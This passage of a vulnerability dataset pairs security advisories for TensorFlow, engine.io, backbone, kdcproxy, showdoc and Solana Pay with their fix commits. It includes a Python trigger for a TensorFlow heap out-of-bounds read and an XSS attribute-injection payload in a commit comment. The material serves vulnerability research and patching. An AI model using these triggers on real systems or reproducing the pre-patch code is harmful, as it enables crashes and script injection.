of the desired amount to the recipient, using the supplied [`validateTransfer` function](https:\/\/github.com\/solana-labs\/solana-pay\/blob\/master\/core\/src\/validateTransfer.ts). An edge case regarding this mechanism could cause the validation logic to validate multiple transfers.\n\n### Impact\nMost known Solana Pay point of sale applications are currently run on physical point of sale devices, which makes this issue unlikely to occur. However, there may be web-based point of sale applications using the protocol where it may be more likely to occur.\n\n### Patches\nThis issue has been patched as of version [`0.2.1`](https:\/\/www.npmjs.com\/package\/@solana\/pay\/v\/0.2.1). Users of the Solana Pay SDK should upgrade to it.","published_date":"2022-08-06","chain_len":1,"project":"https:\/\/github.com\/solana-labs\/solana-pay","commit_href":"https:\/\/github.com\/solana-labs\/solana-pay\/commit\/ac6ce0d0a81137700874a8bf5a7caac3be999fad","commit_sha":"ac6ce0d0a81137700874a8bf5a7caac3be999fad","patch":"SINGLE","chain_ord":"['ac6ce0d0a81137700874a8bf5a7caac3be999fad']","before_first_fix_commit":"{'f41701dc7931f7882c6eb0582c9ddd796eb9d3aa'}","last_fix_commit":"ac6ce0d0a81137700874a8bf5a7caac3be999fad","chain_ord_pos":1.0,"commit_datetime":"07\/28\/2022, 17:15:33","message":"finish transfer validation implementation","author":"Jordan Sexton","comments":null,"stats":"{'additions': 60, 'deletions': 18, 'total': 78}","files":"{'core\/src\/validateTransfer.ts': {'additions': 60, 'deletions': 18, 'changes': 78, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/solana-labs\/solana-pay\/raw\/ac6ce0d0a81137700874a8bf5a7caac3be999fad\/core%2Fsrc%2FvalidateTransfer.ts', 'patch': \"@@ -1,15 +1,23 @@\\n-import { getAssociatedTokenAddress } from '@solana\/spl-token';\\n+import {\\n+    decodeInstruction,\\n+    getAssociatedTokenAddress,\\n+    isTransferCheckedInstruction,\\n+    isTransferInstruction,\\n+} from '@solana\/spl-token';\\n import {\\n     ConfirmedTransactionMeta,\\n     Connection,\\n     Finality,\\n     LAMPORTS_PER_SOL,\\n     Message,\\n+    SystemInstruction,\\n+    Transaction,\\n     TransactionResponse,\\n     TransactionSignature,\\n } from '@solana\/web3.js';\\n import BigNumber from 'bignumber.js';\\n-import { Amount, Memo, Recipient, References, SPLToken } from '.\/types';\\n+import { MEMO_PROGRAM_ID } from '.\/constants';\\n+import { Amount, Memo, Recipient, Reference, References, SPLToken } from '.\/types';\\n \\n \/**\\n  * Thrown when a transaction doesn't contain a valid Solana Pay transfer.\\n@@ -58,33 +66,49 @@ export async function validateTransfer(\\n     if (!meta) throw new ValidateTransferError('missing meta');\\n     if (meta.err) throw meta.err;\\n \\n-    const [preAmount, postAmount] = splToken\\n-        ? await validateSPLTokenTransfer(message, meta, recipient, splToken)\\n-        : await validateSystemTransfer(message, meta, recipient);\\n+    if (reference && !Array.isArray(reference)) {\\n+        reference = [reference];\\n+    }\\n \\n+    const [preAmount, postAmount] = splToken\\n+        ? await validateSPLTokenTransfer(message, meta, recipient, splToken, reference)\\n+        : await validateSystemTransfer(message, meta, recipient, reference);\\n     if (postAmount.minus(preAmount).lt(amount)) throw new ValidateTransferError('amount not transferred');\\n \\n-    if (reference) {\\n-        if (!Array.isArray(reference)) {\\n-            reference = [reference];\\n-        }\\n-\\n-        for (const pubkey of reference) {\\n-            if (!message.accountKeys.some((accountKey) => accountKey.equals(pubkey)))\\n-                throw new ValidateTransferError('reference not found');\\n-        }\\n+    if (memo) {\\n+        \/\/ Check that the second instruction is a memo instruction with the expected memo.\\n+        const transaction = Transaction.populate(message);\\n+        const instruction = transaction.instructions[1];\\n+        if (!instruction) throw new ValidateTransferError('missing memo instruction');\\n+        if (!instruction.programId.equals(MEMO_PROGRAM_ID)) throw new ValidateTransferError('invalid memo program');\\n+        if (!instruction.data.equals(Buffer.from(memo, 'utf8'))) throw new ValidateTransferError('invalid memo');\\n     }\\n \\n-    \/\/ FIXME: add memo check\\n-\\n     return response;\\n }\\n \\n async function validateSystemTransfer(\\n     message: Message,\\n     meta: ConfirmedTransactionMeta,\\n-    recipient: Recipient\\n+    recipient: Recipient,\\n+    references?: Reference[]\\n ): Promise<[BigNumber, BigNumber]> {\\n+    if (references) {\\n+        \/\/ Check that the first instruction is a system transfer instruction.\\n+        const transaction = Transaction.populate(message);\\n+        const instruction = transaction.instructions[0];\\n+        SystemInstruction.decodeTransfer(instruction);\\n+\\n+        \/\/ Check that the expected reference keys exactly match the extra keys provided to the instruction.\\n+        const [_from, _to, ...extraKeys] = instruction.keys;\\n+        const length = extraKeys.length;\\n+        if (length !== references.length) throw new ValidateTransferError('invalid references');\\n+\\n+        for (let i = 0; i < length; i++) {\\n+            if (!extraKeys[i].pubkey.equals(references[i])) throw new ValidateTransferError(`invalid reference ${i}`);\\n+        }\\n+    }\\n+\\n     const accountIndex = message.accountKeys.findIndex((pubkey) => pubkey.equals(recipient));\\n     if (accountIndex === -1) throw new ValidateTransferError('recipient not found');\\n \\n@@ -98,8 +122,26 @@ async function validateSPLTokenTransfer(\\n     message: Message,\\n     meta: ConfirmedTransactionMeta,\\n     recipient: Recipient,\\n-    splToken: SPLToken\\n+    splToken: SPLToken,\\n+    references?: Reference[]\\n ): Promise<[BigNumber, BigNumber]> {\\n+    if (references) {\\n+        \/\/ Check that the first instruction is an SPL token transfer instruction.\\n+        const transaction = Transaction.populate(message);\\n+        const instruction = decodeInstruction(transaction.instructions[0]);\\n+        if (!isTransferCheckedInstruction(instruction) && !isTransferInstruction(instruction))\\n+            throw new ValidateTransferError('invalid transfer');\\n+\\n+        \/\/ Check that the expected reference keys exactly match the extra keys provided to the instruction.\\n+        const extraKeys = instruction.keys.multiSigners;\\n+        const length = extraKeys.length;\\n+        if (length !== references.length) throw new ValidateTransferError('invalid references');\\n+\\n+        for (let i = 0; i < length; i++) {\\n+            if (!extraKeys[i].pubkey.equals(references[i])) throw new ValidateTransferError(`invalid reference ${i}`);\\n+        }\\n+    }\\n+\\n     const recipientATA = await getAssociatedTokenAddress(splToken, recipient);\\n     const accountIndex = message.accountKeys.findIndex((pubkey) => pubkey.equals(recipientATA));\\n     if (accountIndex === -1) throw new ValidateTransferError('recipient not found');\"}}","message_norm":"finish transfer validation implementation","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['core\/src\/validateTransfer.ts'])","num_files":1.0},{"index":2186,"vuln_id":"GHSA-j47f-4232-hvv8","cwe_id":"{'CWE-125'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/44b7f486c0143f68b56c34e2d01e146ee445134a'}","dataset":"osv","summary":"Heap out of bounds read in `RaggedCross` ### Impact\nAn attacker can force accesses outside the bounds of heap allocated arrays by passing in invalid tensor values to `tf.raw_ops.RaggedCross`:\n\n```python\nimport tensorflow as tf\n\nragged_values = []\nragged_row_splits = [] \nsparse_indices = []\nsparse_values = []\nsparse_shape = []\n\ndense_inputs_elem = tf.constant([], shape=[92, 0], dtype=tf.int64)\ndense_inputs = [dense_inputs_elem]\n\ninput_order = \"R\"\nhashed_output = False\nnum_buckets = 0\nhash_key = 0 \n\ntf.raw_ops.RaggedCross(ragged_values=ragged_values,\n    ragged_row_splits=ragged_row_splits,\n    sparse_indices=sparse_indices,\n    sparse_values=sparse_values,\n    sparse_shape=sparse_shape,\n    dense_inputs=dense_inputs,\n    input_order=input_order,\n    hashed_output=hashed_output,\n    num_buckets=num_buckets,\n    hash_key=hash_key,\n    out_values_type=tf.int64,\n    out_row_splits_type=tf.int64)\n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/efea03b38fb8d3b81762237dc85e579cc5fc6e87\/tensorflow\/core\/kernels\/ragged_cross_op.cc#L456-L487) lacks validation for the user supplied arguments:\n\n```cc\nint next_ragged = 0;\nint next_sparse = 0;\nint next_dense = 0;\nfor (char c : input_order_) {\n  if (c == 'R') {\n    TF_RETURN_IF_ERROR(BuildRaggedFeatureReader(\n        ragged_values_list[next_ragged], ragged_splits_list[next_ragged],\n        features));\n    next_ragged++;\n  } else if (c == 'S') {\n    TF_RETURN_IF_ERROR(BuildSparseFeatureReader(\n        sparse_indices_list[next_sparse], sparse_values_list[next_sparse],\n        batch_size, features));\n    next_sparse++;\n  } else if (c == 'D') {\n    TF_RETURN_IF_ERROR(\n        BuildDenseFeatureReader(dense_list[next_dense++], features));\n  }\n  ...\n}\n```\n\nEach of the above branches call a helper function after accessing array elements via a `*_list[next_*]` pattern, followed by incrementing the `next_*` index. However, as there is no validation that the `next_*` values are in the valid range for the corresponding `*_list` arrays, this results in heap OOB reads.\n\n### Patches\nWe have patched the issue in GitHub commit [44b7f486c0143f68b56c34e2d01e146ee445134a](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/44b7f486c0143f68b56c34e2d01e146ee445134a).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/44b7f486c0143f68b56c34e2d01e146ee445134a","commit_sha":"44b7f486c0143f68b56c34e2d01e146ee445134a","patch":"SINGLE","chain_ord":"['44b7f486c0143f68b56c34e2d01e146ee445134a']","before_first_fix_commit":"{'efea03b38fb8d3b81762237dc85e579cc5fc6e87'}","last_fix_commit":"44b7f486c0143f68b56c34e2d01e146ee445134a","chain_ord_pos":1.0,"commit_datetime":"04\/21\/2021, 23:19:54","message":"Fix out of bounds read in `ragged_cross_op.cc`.\n\nPiperOrigin-RevId: 369757702\nChange-Id: Ie6e5d2c21513a8d56bf41fcf35960caf76e890f9","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 30, 'deletions': 0, 'total': 30}","files":"{'tensorflow\/core\/kernels\/ragged_cross_op.cc': {'additions': 30, 'deletions': 0, 'changes': 30, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/44b7f486c0143f68b56c34e2d01e146ee445134a\/tensorflow%2Fcore%2Fkernels%2Fragged_cross_op.cc', 'patch': '@@ -21,6 +21,7 @@ limitations under the License.\\n #include \"tensorflow\/core\/framework\/register_types.h\"\\n #include \"tensorflow\/core\/framework\/tensor.h\"\\n #include \"tensorflow\/core\/framework\/tensor_shape.h\"\\n+#include \"tensorflow\/core\/platform\/errors.h\"\\n #include \"tensorflow\/core\/platform\/fingerprint.h\"\\n #include \"tensorflow\/core\/util\/util.h\"\\n #include \"tensorflow\/core\/util\/work_sharder.h\"\\n@@ -466,16 +467,45 @@ class RaggedCrossOp : public OpKernel {\\n     int next_dense = 0;\\n     for (char c : input_order_) {\\n       if (c == \\'R\\') {\\n+        if (next_ragged >= ragged_values_list.size())\\n+          return errors::InvalidArgument(\\n+              \"input_order \\\\\"\", input_order_,\\n+              \"\\\\\" specifies reading a ragged tensor value at index \",\\n+              next_ragged, \" from a list of \", ragged_values_list.size(),\\n+              \" values.\");\\n+        if (next_ragged >= ragged_splits_list.size())\\n+          return errors::InvalidArgument(\\n+              \"input_order \\\\\"\", input_order_,\\n+              \"\\\\\" specifies reading a ragged tensor split at index \",\\n+              next_ragged, \" from a list of \", ragged_splits_list.size(),\\n+              \" splits.\");\\n         TF_RETURN_IF_ERROR(BuildRaggedFeatureReader(\\n             ragged_values_list[next_ragged], ragged_splits_list[next_ragged],\\n             features));\\n         next_ragged++;\\n       } else if (c == \\'S\\') {\\n+        if (next_sparse >= sparse_values_list.size())\\n+          return errors::InvalidArgument(\\n+              \"input_order \\\\\"\", input_order_,\\n+              \"\\\\\" specifies reading a sparse tensor value at index \",\\n+              next_sparse, \" from a list of \", sparse_values_list.size(),\\n+              \" values.\");\\n+        if (next_sparse >= sparse_indices_list.size())\\n+          return errors::InvalidArgument(\\n+              \"input_order \\\\\"\", input_order_,\\n+              \"\\\\\" specifies reading a sparse tensor index at index \",\\n+              next_sparse, \" from a list of \", sparse_indices_list.size(),\\n+              \" indices.\");\\n         TF_RETURN_IF_ERROR(BuildSparseFeatureReader(\\n             sparse_indices_list[next_sparse], sparse_values_list[next_sparse],\\n             batch_size, features));\\n         next_sparse++;\\n       } else if (c == \\'D\\') {\\n+        if (next_dense >= dense_list.size())\\n+          return errors::InvalidArgument(\\n+              \"input_order \\\\\"\", input_order_,\\n+              \"\\\\\" specifies reading a dense tensor at index \", next_dense,\\n+              \" from a list of \", dense_list.size(), \" tensors.\");\\n         TF_RETURN_IF_ERROR(\\n             BuildDenseFeatureReader(dense_list[next_dense++], features));\\n       } else {'}}","message_norm":"fix out of bounds read in `ragged_cross_op.cc`.\n\npiperorigin-revid: 369757702\nchange-id: ie6e5d2c21513a8d56bf41fcf35960caf76e890f9","language":"en","entities":"[('fix', 'ACTION', ''), ('out of bounds read', 'SECWORD', ''), ('369757702', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/ragged_cross_op.cc'])","num_files":1.0},{"index":2187,"vuln_id":"GHSA-j4f2-536g-r55m","cwe_id":"{'CWE-400'}","score":7.5,"chain":"{'https:\/\/github.com\/socketio\/engine.io\/commit\/734f9d1268840722c41219e69eb58318e0b2ac6b'}","dataset":"osv","summary":"Resource exhaustion in engine.io  Engine.IO before 4.0.0 and 3.6.0 allows attackers to cause a denial of service (resource consumption) via a POST request to the long polling transport.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/socketio\/engine.io","commit_href":"https:\/\/github.com\/socketio\/engine.io\/commit\/734f9d1268840722c41219e69eb58318e0b2ac6b","commit_sha":"734f9d1268840722c41219e69eb58318e0b2ac6b","patch":"SINGLE","chain_ord":"['734f9d1268840722c41219e69eb58318e0b2ac6b']","before_first_fix_commit":"{'61b949259ed966ef6fc8bfd61f14d1a2ef06d319'}","last_fix_commit":"734f9d1268840722c41219e69eb58318e0b2ac6b","chain_ord_pos":1.0,"commit_datetime":"02\/11\/2020, 06:57:29","message":"feat: decrease the default value of maxHttpBufferSize\n\nThis change reduces the default value from 100 mb to a more sane 1 mb.\n\nThis helps protect the server against denial of service attacks by\nmalicious clients sending huge amounts of data.","author":"Damien Arrachequesne","comments":"{'com_1': {'author': 'abergmann', 'datetime': '01\/08\/2021, 09:14:06', 'body': '[CVE-2020-36048](https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2020-36048) was assigned to this commit.'}, 'com_2': {'author': 'ixevix', 'datetime': '05\/11\/2022, 18:37:43', 'body': 'Any luck getting this into an official release on some version of engine.io that socket.io v2.4.x depends on?'}, 'com_3': {'author': 'darrachequesne', 'datetime': '06\/27\/2022, 05:35:10', 'body': '@ixevix here we go:\\r\\n\\r\\n- https:\/\/github.com\/socketio\/engine.io\/releases\/tag\/3.6.0\\r\\n- https:\/\/github.com\/socketio\/socket.io\/releases\/tag\/2.5.0'}}","stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/server.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/socketio\/engine.io\/raw\/734f9d1268840722c41219e69eb58318e0b2ac6b\/lib%2Fserver.js', 'patch': '@@ -26,7 +26,7 @@ class Server extends EventEmitter {\\n         pingTimeout: 5000,\\n         pingInterval: 25000,\\n         upgradeTimeout: 10000,\\n-        maxHttpBufferSize: 10e7,\\n+        maxHttpBufferSize: 1e6,\\n         transports: Object.keys(transports),\\n         allowUpgrades: true,\\n         perMessageDeflate: {'}}","message_norm":"feat: decrease the default value of maxhttpbuffersize\n\nthis change reduces the default value from 100 mb to a more sane 1 mb.\n\nthis helps protect the server against denial of service attacks by\nmalicious clients sending huge amounts of data.","language":"en","entities":"[('protect', 'SECWORD', ''), ('server', 'SECWORD', ''), ('denial of service', 'SECWORD', ''), ('attacks', 'SECWORD', ''), ('malicious', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/server.js'])","num_files":1.0},{"index":2198,"vuln_id":"GHSA-j6p2-cx3w-6jcp","cwe_id":"{'CWE-79'}","score":0.0,"chain":"{'https:\/\/github.com\/jashkenas\/backbone\/commit\/0cdc525961d3fa98e810ffae6bcc8e3838e36d93'}","dataset":"osv","summary":"Cross-Site Scripting in backbone Affected versions of `backbone` are vulnerable to cross-site scripting when users are allowed to supply input to the `Model#Escape` function, and the output is then written to the DOM. \n\nThe vulnerability occurs as a result of the regular expression used to encode metacharacters failing to take HTML Entities such as `&#60;` into account.\n\n\n## Recommendation\n\nUpdate to version 0.5.0 or later.","published_date":"2019-02-18","chain_len":1,"project":"https:\/\/github.com\/jashkenas\/backbone","commit_href":"https:\/\/github.com\/jashkenas\/backbone\/commit\/0cdc525961d3fa98e810ffae6bcc8e3838e36d93","commit_sha":"0cdc525961d3fa98e810ffae6bcc8e3838e36d93","patch":"SINGLE","chain_ord":"['0cdc525961d3fa98e810ffae6bcc8e3838e36d93']","before_first_fix_commit":"{'7216d993502da2e312fc53f4e8edc8b534c25042'}","last_fix_commit":"0cdc525961d3fa98e810ffae6bcc8e3838e36d93","chain_ord_pos":1.0,"commit_datetime":"03\/01\/2011, 21:12:24","message":"Fixed escapeHTML function\nto skip not only &***;, but also &#***; and &x***;","author":"Dmitry Baranovskiy","comments":"{'com_1': {'author': 'alanhogan', 'datetime': '03\/06\/2011, 02:31:15', 'body': 'What are your thoughts on escaping single quotes?\\n\\nUsing single quotes around attribute values is less common than double quotes, but is certainly done:\\n\\n```\\n<p id=\\'foo\\'>\u2026<\/p>\\n```\\n\\nThis can lead to XSS just as unescaped double-quotes can:\\n\\n```\\nvar attack = \" \\' onmouseover=\\'alert(1);\\' foo=\\' \";\\nvar html = \"<p data-user-input=\\'\"+escapeHTML(attack)+\"\\'>Foo<\/p>\";\\ndocument.write(html);\\n```\\n\\nIMO, single quotes really ought to be escaped, as well.'}, 'com_2': {'author': 'alanhogan', 'datetime': '03\/06\/2011, 02:37:31', 'body': 'Demo of attack on jsfiddle: http:\/\/jsfiddle.net\/wEzNJ\/'}}","stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'backbone.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jashkenas\/backbone\/raw\/0cdc525961d3fa98e810ffae6bcc8e3838e36d93\/backbone.js', 'patch': '@@ -1079,7 +1079,7 @@\\n \\n   \/\/ Helper function to escape a string for HTML rendering.\\n   var escapeHTML = function(string) {\\n-    return string.replace(\/&(?!\\\\w+;)\/g, \\'&amp;\\').replace(\/<\/g, \\'&lt;\\').replace(\/>\/g, \\'&gt;\\').replace(\/\"\/g, \\'&quot;\\');\\n+    return string.replace(\/&(?!\\\\w+;|#\\\\d+;|#x[\\\\da-f]+;)\/gi, \\'&amp;\\').replace(\/<\/g, \\'&lt;\\').replace(\/>\/g, \\'&gt;\\').replace(\/\"\/g, \\'&quot;\\');\\n   };\\n \\n }).call(this);'}}","message_norm":"fixed escapehtml function\nto skip not only &***;, but also &#***; and &x***;","language":"en","entities":"[('fixed', 'ACTION', ''), ('escapehtml', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['backbone.js'])","num_files":1.0},{"index":2205,"vuln_id":"GHSA-j7c4-2xj8-wm7r","cwe_id":"{'CWE-20'}","score":7.5,"chain":"{'https:\/\/github.com\/latchset\/kdcproxy\/commit\/f274aa6787cb8b3ec1cc12c440a56665b7231882'}","dataset":"osv","summary":"Moderate severity vulnerability that affects kdcproxy python-kdcproxy before 0.3.2 allows remote attackers to cause a denial of service via a large POST request.","published_date":"2018-11-01","chain_len":1,"project":"https:\/\/github.com\/latchset\/kdcproxy","commit_href":"https:\/\/github.com\/latchset\/kdcproxy\/commit\/f274aa6787cb8b3ec1cc12c440a56665b7231882","commit_sha":"f274aa6787cb8b3ec1cc12c440a56665b7231882","patch":"SINGLE","chain_ord":"['f274aa6787cb8b3ec1cc12c440a56665b7231882']","before_first_fix_commit":"{'e4a71193099cd395578bcf32f4eb8beaa7da3e43'}","last_fix_commit":"f274aa6787cb8b3ec1cc12c440a56665b7231882","chain_ord_pos":1.0,"commit_datetime":"08\/03\/2015, 18:38:49","message":"Enforce a maximum packet length\n\nPermanently fixes CVE-2015-5159 for all applications.","author":"Nathaniel McCallum","comments":null,"stats":"{'additions': 6, 'deletions': 1, 'total': 7}","files":"{'kdcproxy\/__init__.py': {'additions': 6, 'deletions': 1, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/latchset\/kdcproxy\/raw\/f274aa6787cb8b3ec1cc12c440a56665b7231882\/kdcproxy%2F__init__.py', 'patch': '@@ -61,6 +61,7 @@ def __str__(self):\\n \\n \\n class Application:\\n+    MAX_LENGTH = 128 * 1024\\n     SOCKTYPES = {\\n         \"tcp\": socket.SOCK_STREAM,\\n         \"udp\": socket.SOCK_DGRAM,\\n@@ -180,7 +181,11 @@ def __call__(self, env, start_response):\\n             try:\\n                 length = int(env[\"CONTENT_LENGTH\"])\\n             except AttributeError:\\n-                length = -1\\n+                raise HTTPException(411, \"Length required.\")\\n+            if length < 0:\\n+                raise HTTPException(411, \"Length required.\")\\n+            if length > self.MAX_LENGTH:\\n+                raise HTTPException(413, \"Request entity too large.\")\\n             try:\\n                 pr = codec.decode(env[\"wsgi.input\"].read(length))\\n             except codec.ParsingError as e:'}}","message_norm":"enforce a maximum packet length\n\npermanently fixes cve-2015-5159 for all applications.","language":"en","entities":"[('fixes', 'ACTION', ''), ('cve-2015-5159', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['kdcproxy\/__init__.py'])","num_files":1.0},{"index":2209,"vuln_id":"GHSA-j7rm-8ww4-xx2g","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0d45ea1ca641b21b73bcf9c00e0179cda284e7e7'}","dataset":"osv","summary":"Division by zero in TFLite's implementation of `SpaceToDepth` ### Impact\nThe `Prepare` step of the `SpaceToDepth` TFLite operator [does not check for 0 before division](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/5f7975d09eac0f10ed8a17dbb6f5964977725adc\/tensorflow\/lite\/kernels\/space_to_depth.cc#L63-L67).\n\n```cc \nconst int block_size = params->block_size;\nconst int input_height = input->dims->data[1];\nconst int input_width = input->dims->data[2];\nint output_height = input_height \/ block_size;\nint output_width = input_width \/ block_size;\n```   \n\nAn attacker can craft a model such that `params->block_size` would be zero.\n\n### Patches\nWe have patched the issue in GitHub commit [0d45ea1ca641b21b73bcf9c00e0179cda284e7e7](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0d45ea1ca641b21b73bcf9c00e0179cda284e7e7).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0d45ea1ca641b21b73bcf9c00e0179cda284e7e7","commit_sha":"0d45ea1ca641b21b73bcf9c00e0179cda284e7e7","patch":"SINGLE","chain_ord":"['0d45ea1ca641b21b73bcf9c00e0179cda284e7e7']","before_first_fix_commit":"{'5f7975d09eac0f10ed8a17dbb6f5964977725adc'}","last_fix_commit":"0d45ea1ca641b21b73bcf9c00e0179cda284e7e7","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2021, 00:45:57","message":"Prevent one more div by 0 in TFLite\n\nPiperOrigin-RevId: 370800114\nChange-Id: I6b956aeb8c458cc6f514408d2e89ffacfe249e57","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'tensorflow\/lite\/kernels\/space_to_depth.cc': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/0d45ea1ca641b21b73bcf9c00e0179cda284e7e7\/tensorflow%2Flite%2Fkernels%2Fspace_to_depth.cc', 'patch': '@@ -61,6 +61,7 @@ TfLiteStatus Prepare(TfLiteContext* context, TfLiteNode* node) {\\n   TF_LITE_ENSURE_TYPES_EQ(context, input->type, output->type);\\n \\n   const int block_size = params->block_size;\\n+  TF_LITE_ENSURE(context, block_size > 0);\\n   const int input_height = input->dims->data[1];\\n   const int input_width = input->dims->data[2];\\n   int output_height = input_height \/ block_size;'}}","message_norm":"prevent one more div by 0 in tflite\n\npiperorigin-revid: 370800114\nchange-id: i6b956aeb8c458cc6f514408d2e89ffacfe249e57","language":"en","entities":"[('prevent', 'ACTION', ''), ('div by 0', 'SECWORD', ''), ('370800114', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/space_to_depth.cc'])","num_files":1.0},{"index":2213,"vuln_id":"GHSA-j85q-whc9-g4p9","cwe_id":"{'CWE-338'}","score":5.9,"chain":"{'https:\/\/github.com\/star7th\/showdoc\/commit\/4b962c1740311e0d46775023b6acba39ad60e370'}","dataset":"osv","summary":"Use of Cryptographically Weak Pseudo-Random Number Generator in showdoc showdoc is vulnerable to Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)","published_date":"2021-09-02","chain_len":1,"project":"https:\/\/github.com\/star7th\/showdoc","commit_href":"https:\/\/github.com\/star7th\/showdoc\/commit\/4b962c1740311e0d46775023b6acba39ad60e370","commit_sha":"4b962c1740311e0d46775023b6acba39ad60e370","patch":"SINGLE","chain_ord":"['4b962c1740311e0d46775023b6acba39ad60e370']","before_first_fix_commit":"{'db53edb8323dd358dc955e71d8f1fad5dab4ab7b', '034328ab35fc2bf640bf7fef2be40a5d13123b11'}","last_fix_commit":"4b962c1740311e0d46775023b6acba39ad60e370","chain_ord_pos":1.0,"commit_datetime":"08\/03\/2021, 17:19:35","message":"Merge pull request #1438 from michaellrowley\/security-patch\n\nCVE-2021-3678 Patch","author":"star7th","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'server\/Application\/Api\/Controller\/AdminSettingController.class.php': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/star7th\/showdoc\/raw\/4b962c1740311e0d46775023b6acba39ad60e370\/server%2FApplication%2FApi%2FController%2FAdminSettingController.class.php', 'patch': '@@ -166,7 +166,7 @@ public function getLoginSecretKey(){\\n         $this->checkAdmin();\\n         $login_secret_key = D(\"Options\")->get(\"login_secret_key\") ;\\n         if(!$login_secret_key){\\n-            $login_secret_key = md5(\"rgrsfsrfsrf\".time().rand(1,9000000000000000).uniqid());\\n+            $login_secret_key = bin2hex( random_bytes( 16 ) );\\n             D(\"Options\")->set(\"login_secret_key\",$login_secret_key) ;\\n         }\\n         $this->sendResult(array(\"login_secret_key\"=>$login_secret_key));\\n@@ -176,7 +176,7 @@ public function getLoginSecretKey(){\\n     public function resetLoginSecretKey(){\\n         $login_user = $this->checkLogin();\\n         $this->checkAdmin();\\n-        $login_secret_key = md5(\"rgrsfsrfsrf\".time().rand(1,9000000000000000).uniqid());\\n+        $login_secret_key = bin2hex( random_bytes( 16 ) );\\n         D(\"Options\")->set(\"login_secret_key\",$login_secret_key) ;\\n         $this->sendResult(array(\"login_secret_key\"=>$login_secret_key));'}}","message_norm":"merge pull request #1438 from michaellrowley\/security-patch\n\ncve-2021-3678 patch","language":"en","entities":"[('#1438', 'ISSUE', ''), ('security', 'SECWORD', ''), ('cve-2021-3678', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['server\/Application\/Api\/Controller\/AdminSettingController.class.php'])","num_files":1.0},{"index":2214,"vuln_id":"GHSA-j86v-p27c-73fm","cwe_id":"{'CWE-824'}","score":7.8,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f09caa532b6e1ac8d2aa61b7832c78c5b79300c6'}","dataset":"osv","summary":"Unitialized access in `EinsumHelper::ParseEquation` ### Impact\nDuring execution, [`EinsumHelper::ParseEquation()`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/e0b6e58c328059829c3eb968136f17aa72b6c876\/tensorflow\/core\/kernels\/linalg\/einsum_op_impl.h#L126-L181) is supposed to set the flags in `input_has_ellipsis` vector and `*output_has_ellipsis` boolean to indicate whether there is ellipsis in the corresponding inputs and output.\n\nHowever, the code only changes these flags to `true` and never assigns `false`.\n\n```cc\nfor (int i = 0; i < num_inputs; ++i) {\n  input_label_counts->at(i).resize(num_labels);\n  for (const int label : input_labels->at(i)) {\n    if (label != kEllipsisLabel)\n      input_label_counts->at(i)[label] += 1;\n    else\n      input_has_ellipsis->at(i) = true;\n  }\n}\noutput_label_counts->resize(num_labels);\nfor (const int label : *output_labels) {\n  if (label != kEllipsisLabel)\n    output_label_counts->at(label) += 1;\n  else\n    *output_has_ellipsis = true;\n}\n```\n\nThis results in unitialized variable access if callers assume that `EinsumHelper::ParseEquation()` always sets these flags.\n\n\n### Patches\nWe have patched the issue in GitHub commit 